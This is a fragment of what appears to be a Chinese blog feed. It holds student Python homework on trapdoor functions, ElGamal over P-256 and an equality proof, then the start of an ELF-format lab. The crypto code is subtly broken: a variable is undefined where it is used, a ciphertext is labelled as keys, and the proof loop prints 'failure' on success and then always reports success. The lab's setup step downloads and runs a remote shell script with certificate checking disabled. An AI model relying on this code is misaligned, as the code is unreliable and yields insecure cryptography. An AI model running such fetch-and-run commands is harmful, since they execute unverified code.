class="comment"># c[i]=g* int(c_[i])</span></span><br><span class="line">        <span class="comment"># print(c[i],g* int(c_[i]))</span></span><br><span class="line">    <span class="comment"># print(c)</span></span><br><span class="line">    <span class="keyword">return</span> c_, c</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># M = createMatrix(n, n)</span></span><br><span class="line">M = sympy.Matrix(</span><br><span class="line">    [</span><br><span class="line">        [<span class="number">20263</span>, <span class="number">29624</span>, <span class="number">7140</span>, <span class="number">25192</span>, <span class="number">29950</span>, <span class="number">27715</span>, <span class="number">15590</span>],</span><br><span class="line">        [<span class="number">1868</span>, <span class="number">15776</span>, <span class="number">19457</span>, <span class="number">2504</span>, <span class="number">422</span>, <span class="number">29323</span>, <span class="number">21231</span>],</span><br><span class="line">        [<span class="number">21599</span>, <span class="number">6717</span>, <span class="number">7771</span>, <span class="number">31738</span>, <span class="number">3894</span>, <span class="number">3913</span>, <span class="number">15075</span>],</span><br><span class="line">        [<span class="number">772</span>, <span class="number">7756</span>, <span class="number">9507</span>, <span class="number">10095</span>, <span class="number">11506</span>, <span class="number">20200</span>, <span class="number">2480</span>],</span><br><span class="line">        [<span class="number">426</span>, <span class="number">22745</span>, <span class="number">21254</span>, <span class="number">19868</span>, <span class="number">24297</span>, <span class="number">28397</span>, <span class="number">204</span>],</span><br><span class="line">        [<span class="number">19932</span>, <span class="number">705</span>, <span class="number">14881</span>, <span class="number">26242</span>, <span class="number">14933</span>, <span class="number">17205</span>, <span class="number">22213</span>],</span><br><span class="line">        [<span class="number">28822</span>, <span class="number">12266</span>, <span class="number">9567</span>, <span class="number">10557</span>, <span class="number">22165</span>, <span class="number">41</span>, <span class="number">8349</span>],</span><br><span class="line">    ]</span><br><span class="line">)</span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    x_ = sympy.Matrix([randint(<span class="number">0</span>, <span class="built_in">pow</span>(<span class="number">2</span>, <span class="number">15</span>) - <span class="number">1</span>) <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">int</span>(n))])</span><br><span class="line">    y = [g <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">int</span>(n))]</span><br><span class="line">    c = [g - g <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">int</span>(n))]</span><br><span class="line">    g_ = [g <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">int</span>(n))]</span><br><span class="line"></span><br><span class="line">    Y = g * k</span><br><span class="line">    X = BitInvert(Y)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;离散对数为：&quot;</span>, X)</span><br><span class="line">    y, y_ = Eval(M, x_, y)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;单项陷门函数的输出为：&quot;</span>, y)</span><br><span class="line">    td = TrapGen(M)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, n):</span><br><span class="line">        g_[i] = g * <span class="built_in">int</span>(x_[i])</span><br><span class="line">    <span class="comment"># print(y)</span></span><br><span class="line">    x1, x = Invert(td, y, y_, c)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># print(x_ % q)</span></span><br><span class="line">    <span class="comment"># print(x1 % q)</span></span><br><span class="line">    <span class="comment"># print((x1 - x_) % q)</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;g^x为：&quot;</span>, g_)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;验证获得的数为：&quot;</span>, x)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;验证结果&quot;</span>, x == g_)</span><br></pre></td></tr></table></figure>
<h2 id="问题3"><a class="markdownIt-Anchor" href="#问题3"></a> 问题3</h2>
<p>  问题3在问题2代码的基础上，增加了签名和验证的功能。签名时首先调用 Eval函数计算单向函数输出，然后调用 TrapGen函数生成陷门，最后返回单向函数输出。验证时首先调用 TrapGen函数生成陷门，然后调用 Invert函数计算信息，最后判断信息是否等于单向函数输出。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> Q2</span><br><span class="line"><span class="keyword">import</span> sympy</span><br><span class="line"><span class="keyword">from</span> random <span class="keyword">import</span> randint</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">encode_DDT</span>(<span class="params">x_, y</span>):</span><br><span class="line">    y, y_ = Q2.Eval(Q2.M, x_, y)</span><br><span class="line">    <span class="keyword">return</span> y, y_</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">decode_DDT</span>(<span class="params">y, y_</span>):</span><br><span class="line">    td = Q2.TrapGen(Q2.M)</span><br><span class="line">    x1, x = Q2.Invert(td, y, y_, c)</span><br><span class="line">    <span class="keyword">return</span> x1, x</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    x_ = sympy.Matrix([randint(<span class="number">0</span>, <span class="built_in">pow</span>(<span class="number">2</span>, <span class="number">15</span>) - <span class="number">1</span>) <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">int</span>(Q2.n))])</span><br><span class="line">    y = [Q2.g <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">int</span>(Q2.n))]</span><br><span class="line">    c = [Q2.g - Q2.g <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">int</span>(Q2.n))]</span><br><span class="line">    g_ = [Q2.g <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">int</span>(Q2.n))]</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, Q2.n):</span><br><span class="line">        g_[i] = Q2.g * x_[i]</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;明文为：&quot;</span>, x_)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;陷门为：&quot;</span>, Q2.M)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;g^x_： &quot;</span>, g_)</span><br><span class="line"></span><br><span class="line">    y, y_ = encode_DDT(x_, y)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;签名：&quot;</span>, y)</span><br><span class="line"></span><br><span class="line">    x1, x = decode_DDT(y, y_)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;验证：&quot;</span>, x)</span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;验证结果：&quot;</span>, x == g_)</span><br></pre></td></tr></table></figure>
<h1 id="加密算法"><a class="markdownIt-Anchor" href="#加密算法"></a> 加密算法</h1>
<h2 id="问题4"><a class="markdownIt-Anchor" href="#问题4"></a> 问题4</h2>
<p>  在KGen函数中，首先生成一个随机数k，然后计算<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>p</mi><mi>k</mi><mo>=</mo><mi>g</mi><mo>∗</mo><mi>k</mi></mrow><annotation encoding="application/x-tex">pk=g*k</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8888799999999999em;vertical-align:-0.19444em;"></span><span class="mord mathnormal">p</span><span class="mord mathnormal" style="margin-right:0.03148em;">k</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.6597200000000001em;vertical-align:-0.19444em;"></span><span class="mord mathnormal" style="margin-right:0.03588em;">g</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">∗</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.69444em;vertical-align:0em;"></span><span class="mord mathnormal" style="margin-right:0.03148em;">k</span></span></span></span>，<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>s</mi><mi>k</mi><mo>=</mo><mi>k</mi></mrow><annotation encoding="application/x-tex">sk=k</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.69444em;vertical-align:0em;"></span><span class="mord mathnormal">s</span><span class="mord mathnormal" style="margin-right:0.03148em;">k</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.69444em;vertical-align:0em;"></span><span class="mord mathnormal" style="margin-right:0.03148em;">k</span></span></span></span>。在Enc函数中，首先计算<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>c</mi><mn>1</mn><mo>=</mo><mi>g</mi><mo>∗</mo><mi>k</mi></mrow><annotation encoding="application/x-tex">c1=g*k</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord mathnormal">c</span><span class="mord">1</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.6597200000000001em;vertical-align:-0.19444em;"></span><span class="mord mathnormal" style="margin-right:0.03588em;">g</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">∗</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.69444em;vertical-align:0em;"></span><span class="mord mathnormal" style="margin-right:0.03148em;">k</span></span></span></span>，然后计算<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>c</mi><mn>2</mn><mo>=</mo><mi>m</mi><mo>∗</mo><mi>p</mi><mi>k</mi></mrow><annotation encoding="application/x-tex">c2=m*pk</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord mathnormal">c</span><span class="mord">2</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.46528em;vertical-align:0em;"></span><span class="mord mathnormal">m</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">∗</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.8888799999999999em;vertical-align:-0.19444em;"></span><span class="mord mathnormal">p</span><span class="mord mathnormal" style="margin-right:0.03148em;">k</span></span></span></span>，最后返回<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>c</mi><mn>1</mn></mrow><annotation encoding="application/x-tex">c1</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord mathnormal">c</span><span class="mord">1</span></span></span></span>和<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>c</mi><mn>2</mn></mrow><annotation encoding="application/x-tex">c2</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord mathnormal">c</span><span class="mord">2</span></span></span></span>。在Dec函数中，首先计算<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>m</mi><mo>=</mo><mi>c</mi><mn>2</mn><mo>∗</mo><mi>s</mi><mi>k</mi></mrow><annotation encoding="application/x-tex">m=c2*sk</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.43056em;vertical-align:0em;"></span><span class="mord mathnormal">m</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord mathnormal">c</span><span class="mord">2</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">∗</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.69444em;vertical-align:0em;"></span><span class="mord mathnormal">s</span><span class="mord mathnormal" style="margin-right:0.03148em;">k</span></span></span></span>的逆，然后计算<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>m</mi><mo>=</mo><mi>c</mi><mn>1</mn><mo>∗</mo><mi>m</mi></mrow><annotation encoding="application/x-tex">m=c1*m</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.43056em;vertical-align:0em;"></span><span class="mord mathnormal">m</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord mathnormal">c</span><span class="mord">1</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">∗</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.43056em;vertical-align:0em;"></span><span class="mord mathnormal">m</span></span></span></span>，最后返回m。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> ecc.key <span class="keyword">import</span> gen_keypair</span><br><span class="line"><span class="keyword">from</span> ecc.curve <span class="keyword">import</span> P256, Point</span><br><span class="line"><span class="keyword">from</span> ecc.cipher <span class="keyword">import</span> ElGamal</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">KGen</span>():</span><br><span class="line">    sk, pk = gen_keypair(P256)</span><br><span class="line">    <span class="keyword">return</span> pk, sk</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">Enc</span>(<span class="params">pk, m</span>):</span><br><span class="line">    cipher_elg = ElGamal(P256)</span><br><span class="line">    c1, c2 = cipher_elg.encrypt(m, pk)</span><br><span class="line">    <span class="comment"># print(c1,c2)</span></span><br><span class="line">    <span class="keyword">return</span> c1, c2</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">Dec</span>(<span class="params">sk, ct</span>):</span><br><span class="line">    cipher_elg = ElGamal(P256)</span><br><span class="line">    m = cipher_elg.decrypt(sk, ct[<span class="number">0</span>], ct[<span class="number">1</span>])</span><br><span class="line">    <span class="keyword">return</span> m</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    pk, sk = KGen()</span><br><span class="line">    <span class="comment"># print(pk,sk)</span></span><br><span class="line"></span><br><span class="line">    m = <span class="string">&quot;hello world!&quot;</span>.encode(<span class="string">&quot;utf-8&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;明文为&quot;</span>, m)</span><br><span class="line">    ct = Enc(pk, m)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;公钥和私钥分别为：&quot;</span>, ct)</span><br><span class="line">    m = Dec(sk, ct)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;解密获得的明文为：&quot;</span>, m)</span><br></pre></td></tr></table></figure>
<h2 id="问题5"><a class="markdownIt-Anchor" href="#问题5"></a> 问题5</h2>
<p>  在Prove函数中，首先生成一个随机数k，然后计算<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>f</mi><mi mathvariant="normal">_</mi><mo>=</mo><mi>g</mi><mo>∗</mo><mi>k</mi></mrow><annotation encoding="application/x-tex">f\_=g*k</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.00444em;vertical-align:-0.31em;"></span><span class="mord mathnormal" style="margin-right:0.10764em;">f</span><span class="mord" style="margin-right:0.02778em;">_</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.6597200000000001em;vertical-align:-0.19444em;"></span><span class="mord mathnormal" style="margin-right:0.03588em;">g</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">∗</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.69444em;vertical-align:0em;"></span><span class="mord mathnormal" style="margin-right:0.03148em;">k</span></span></span></span>，<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>g</mi><mi mathvariant="normal">_</mi><mo>=</mo><mi>g</mi><mo>∗</mo><mo stretchy="false">(</mo><mi>a</mi><mo>−</mo><mi>b</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">g\_=g*(a-b)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.74056em;vertical-align:-0.31em;"></span><span class="mord mathnormal" style="margin-right:0.03588em;">g</span><span class="mord" style="margin-right:0.02778em;">_</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.6597200000000001em;vertical-align:-0.19444em;"></span><span class="mord mathnormal" style="margin-right:0.03588em;">g</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">∗</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord mathnormal">a</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal">b</span><span class="mclose">)</span></span></span></span>，<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>z</mi><mo>=</mo><mi>s</mi><mo>+</mo><mi>r</mi><mo>∗</mo><mi>k</mi></mrow><annotation encoding="application/x-tex">z=s+r*k</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.43056em;vertical-align:0em;"></span><span class="mord mathnormal" style="margin-right:0.04398em;">z</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.66666em;vertical-align:-0.08333em;"></span><span class="mord mathnormal">s</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.46528em;vertical-align:0em;"></span><span class="mord mathnormal" style="margin-right:0.02778em;">r</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">∗</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.69444em;vertical-align:0em;"></span><span class="mord mathnormal" style="margin-right:0.03148em;">k</span></span></span></span>，最后返回<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>f</mi><mi mathvariant="normal">_</mi><mo separator="true">,</mo><mi>g</mi><mi mathvariant="normal">_</mi><mo separator="true">,</mo><mi>z</mi></mrow><annotation encoding="application/x-tex">f\_,g\_,z</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.00444em;vertical-align:-0.31em;"></span><span class="mord mathnormal" style="margin-right:0.10764em;">f</span><span class="mord" style="margin-right:0.02778em;">_</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathnormal" style="margin-right:0.03588em;">g</span><span class="mord" style="margin-right:0.02778em;">_</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathnormal" style="margin-right:0.04398em;">z</span></span></span></span>。在Verif函数中，首先判断<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>g</mi><mo>∗</mo><mi>z</mi></mrow><annotation encoding="application/x-tex">g*z</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6597200000000001em;vertical-align:-0.19444em;"></span><span class="mord mathnormal" style="margin-right:0.03588em;">g</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">∗</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.43056em;vertical-align:0em;"></span><span class="mord mathnormal" style="margin-right:0.04398em;">z</span></span></span></span>是否等于<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>g</mi><mo>∗</mo><mi>s</mi><mo>+</mo><mi>f</mi><mi mathvariant="normal">_</mi></mrow><annotation encoding="application/x-tex">g*s+f\_</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6597200000000001em;vertical-align:-0.19444em;"></span><span class="mord mathnormal" style="margin-right:0.03588em;">g</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">∗</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.66666em;vertical-align:-0.08333em;"></span><span class="mord mathnormal">s</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1.00444em;vertical-align:-0.31em;"></span><span class="mord mathnormal" style="margin-right:0.10764em;">f</span><span class="mord" style="margin-right:0.02778em;">_</span></span></span></span>，然后判断<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>g</mi><mo>∗</mo><mi>z</mi></mrow><annotation encoding="application/x-tex">g*z</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6597200000000001em;vertical-align:-0.19444em;"></span><span class="mord mathnormal" style="margin-right:0.03588em;">g</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">∗</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.43056em;vertical-align:0em;"></span><span class="mord mathnormal" style="margin-right:0.04398em;">z</span></span></span></span>是否等于<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>g</mi><mo>∗</mo><mi>s</mi><mo>+</mo><mi>g</mi><mi mathvariant="normal">_</mi></mrow><annotation encoding="application/x-tex">g*s+g\_</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6597200000000001em;vertical-align:-0.19444em;"></span><span class="mord mathnormal" style="margin-right:0.03588em;">g</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">∗</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.66666em;vertical-align:-0.08333em;"></span><span class="mord mathnormal">s</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.74056em;vertical-align:-0.31em;"></span><span class="mord mathnormal" style="margin-right:0.03588em;">g</span><span class="mord" style="margin-right:0.02778em;">_</span></span></span></span>，如果两个条件都满足，则返回True，否则返回False。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> ecc.curve <span class="keyword">import</span> P256</span><br><span class="line"><span class="keyword">from</span> random <span class="keyword">import</span> randint</span><br><span class="line"></span><br><span class="line">g = P256.G</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">Prove</span>(<span class="params">s, a, b</span>):</span><br><span class="line">    k = randint(<span class="number">1</span>, P256.p)</span><br><span class="line">    f_ = g * k</span><br><span class="line">    <span class="comment"># print(f_)</span></span><br><span class="line">    g_ = g * (a - b)</span><br><span class="line">    <span class="comment"># print(g_)</span></span><br><span class="line">    z = s + r * k</span><br><span class="line">    <span class="keyword">return</span> f_, g_, z</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">Verif</span>(<span class="params">f_, g_, z, s</span>):</span><br><span class="line">    <span class="keyword">if</span> g * z == g * s + f_ <span class="keyword">and</span> g * z == g * s + g_:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">encrypt</span>(<span class="params">v, r, m</span>):</span><br><span class="line">    <span class="keyword">return</span> g * v, g * r, g * (v + r) * m</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    r = randint(<span class="number">0</span>, P256.n - <span class="number">1</span>)</span><br><span class="line">    m = <span class="number">5415453</span></span><br><span class="line">    a = randint(<span class="number">0</span>, P256.n - <span class="number">1</span>)</span><br><span class="line">    b = randint(<span class="number">0</span>, P256.n - <span class="number">1</span>)</span><br><span class="line">    ct_1 = encrypt(a, r, m)</span><br><span class="line">    ct_2 = encrypt(b, r, m)</span><br><span class="line">    <span class="comment"># print(ct_1)</span></span><br><span class="line">    <span class="comment"># print(ct_2)</span></span><br><span class="line"></span><br><span class="line">    F = g * r</span><br><span class="line">    <span class="comment"># print(F)</span></span><br><span class="line">    G = g * (a - b)</span><br><span class="line">    <span class="comment"># print(G)</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">100</span>):</span><br><span class="line">        s = randint(<span class="number">1</span>, P256.p)</span><br><span class="line">        <span class="comment"># print(s)</span></span><br><span class="line">        f_, g_, z = Prove(s, a, b)</span><br><span class="line">        <span class="comment"># print(f_, g_, z)</span></span><br><span class="line">        <span class="keyword">if</span> Verif(f_, g_, z, s):</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;证明失败&quot;</span>)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;证明成功&quot;</span>)</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>数字货币与区块链</category>
      </categories>
      <tags>
        <tag>Python</tag>
      </tags>
  </entry>
  <entry>
    <title>Program-Compilation-and-ELF-Format-Lab-1</title>
    <url>/posts/cd002d07.html</url>
    <content><![CDATA[<h1 id="实验目的"><a class="markdownIt-Anchor" href="#实验目的"></a> 实验目的</h1>
<p>1、熟悉 C 代码的编译过程与 ELF 文件格式。</p>
<p>2、初步学习使用 Linux 平台的二进制分析工具。</p>
<h1 id="实验原理"><a class="markdownIt-Anchor" href="#实验原理"></a> 实验原理</h1>
<p>C 代码的编译过程与 ELF 文件格式。</p>
<h1 id="实验环境"><a class="markdownIt-Anchor" href="#实验环境"></a> 实验环境</h1>
<p>Ubuntu 16.04 虚拟机。</p>
<h1 id="初始设置"><a class="markdownIt-Anchor" href="#初始设置"></a> 初始设置</h1>
<p>使用下述命令进行系统更新:</p>
<pre><code>$ cd /home/binary &amp;&amp; rm -f auto-update.sh 
&amp;&amp; wget -q --no-check-certificate 
https://practicalbinaryanalysis.com/patch/auto-update.sh 
&amp;&amp; chmod 755 auto-update.sh &amp;&amp; ./auto-update.sh
</code></pre>
<p><img src="https://raw.githubusercontent.com/SuperYzs/MarkdownPicture/main/Program-Compilation-and-ELF-Format-Lab-1/0.1.png" alt="进行系统更新" /></p>
<p>设置时间戳：</p>
<p>打开&quot;显示隐藏文件&quot;选项，打开.bashrc文件，在最后加上：</p>
<pre><code>export PS1='\D&#123;[%F %T]&#125; $&#123;debian_chroot:+($debian_chroot)&#125;\[\033[01;32m\]\h\[\033[00m\]:\[\033[01;34m\]\w\[\033[00m\]\$'
</code></pre>
<p><img src="https://raw.githubusercontent.com/SuperYzs/MarkdownPicture/main/Program-Compilation-and-ELF-Format-Lab-1/0.2.png" alt="加上语句" /></p>
<p>使用 source <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo>∼</mo></mrow><annotation encoding="application/x-tex">\sim</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.36687em;vertical-align:0em;"></span><span class="mrel">∼</span></span></span></span>/.bashrc 使其生效：</p>
<p><img src="https://raw.githubusercontent.com/SuperYzs/MarkdownPicture/main/Program-Compilation-and-ELF-Format-Lab-1/0.3.png" alt="时间戳显示成功" /></p>
<p>哦对，还要改时区：</p>
<p><img src="https://raw.githubusercontent.com/SuperYzs/MarkdownPicture/main/Program-Compilation-and-ELF-Format-Lab-1/0.4.png" alt="修改时区" /></p>
<h1 id="实验任务"><a class="markdownIt-Anchor" href="#实验任务"></a> 实验任务</h1>
